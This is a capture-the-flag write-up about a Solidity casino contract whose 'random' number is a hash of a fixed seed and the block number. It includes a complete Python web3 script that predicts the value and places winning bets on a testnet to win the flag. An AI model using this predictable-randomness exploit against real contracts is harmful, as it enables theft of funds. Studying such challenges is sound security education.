# Crypto Casino
We were given the challenge text:
```
there's is cool decentralized casino, you can play as much as you want but if you lose once you lost everything

address : 0x186d5d064545f6211dD1B5286aB2Bc755dfF2F59
```

Along with the file [contract.sol](contract.sol).

In the contract source code we see that it generated a number, `uint num = uint(keccak256(abi.encodePacked(seed, block.number))) ^ 0x539;` where the seed is defined as `keccak256("satoshi nakmoto");`. First it encodes the seed and the current block numer, this is then hashed using keccask256. This is then casted to an integer, and XORed with 0x539. Since I was using Python to do transactions, I rewrote it in Python.

```py
seed = w3.solidityKeccak(['string'], ['satoshi nakmoto']) # https://eth-abi.readthedocs.io/en/latest/encoding.html#non-standard-packed-mode-encoding
guess = encode_abi_packed(['bytes', 'uint256'], (seed, w3.eth.block_number()+1)) # +1 since we need the block number after our tx has passed. https://eth-abi.readthedocs.io/en/latest/encoding.html#non-standard-packed-mode-encoding
guess = w3.solidityKeccak(['bytes'], [guess])
guess = int(guess.hex(), 16) ^ 0x539
```

We need our `guess` argument to be equal to the contract's `num` 2 times in a row for us to be able to get the flag. Here's my final Python code
```py
from eth_abi.packed import encode_abi_packed
from time import sleep
from web3 import Web3, HTTPProvider
from web3.middleware import geth_poa_middleware

w3 = Web3(Web3.HTTPProvider('https://rinkeby.infura.io/v3/API_KEY')) # Instead of running a local node to connect to the Rinkeby network, I used https://infura.io/

w3.middleware_onion.inject(geth_poa_middleware, layer=0) # Some stuff StackOverflow told me to add after I got errors

contract_address = '0x186d5d064545f6211dD1B5286aB2Bc755dfF2F59' # The address of the contract

# I used http://remix.ethereum.org/ to generate the ABI for me from the source code, this allows web3 to know what kind of functions exist in the contract, what those function return, etc.
abi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"uint256","name":"guess","type":"uint256"}],"name":"bet","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"consecutiveWins","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"done","outputs":[{"internalType":"int","name":"","type":"int"}],"stateMutability":"view","type":"function"}]

contract = w3.eth.contract(contract_address, abi=abi)

# Mimics the code from the contract so we get the correct guess
seed = w3.solidityKeccak(['string'], ['satoshi nakmoto'])
guess = encode_abi_packed(['bytes', 'uint256'], (seed, w3.eth.block_number()+1))
guess = w3.solidityKeccak(['bytes'], [guess])
guess = int(guess.hex(), 16) ^ 0x539

for _ in range(2): # the contract requires us to bet correctly twice
    transaction = contract.functions.bet(guess).buildTransaction({ # this time we have to send a tx instead of simply calling the function, as we want to make a change on the blockchain
        'gas': 70000,
        'gasPrice': w3.toWei('1', 'gwei'),
        'from': 'ETH pub key',
        'nonce': w3.eth.getTransactionCount('ETH pub key')
        }) 
    private_key = 'ETH priv key' 
    txn_hash = w3.eth.account.signTransaction(transaction, private_key=private_key)
    txn_receipt = w3.eth.sendRawTransaction(txn_hash.rawTransaction)
    sleep(16) # blocktime on Rinkeby is 15 seconds, sleep until we're guaranteed in the next block to prevent "already known" error.

print(contract.functions.done().call({'from': 'ETH pub key'})) # call the done function which should return the flag if we've betted correctly more than once
```

Once again I encountered the problem I had on crackme, the only output I got was `102`. Since I had modified the library to output raw response data as well, I removed the nullbytes from it and got the flag: `flag{D3CN7R@l1Z3D_C@51N0S_5uck531}`.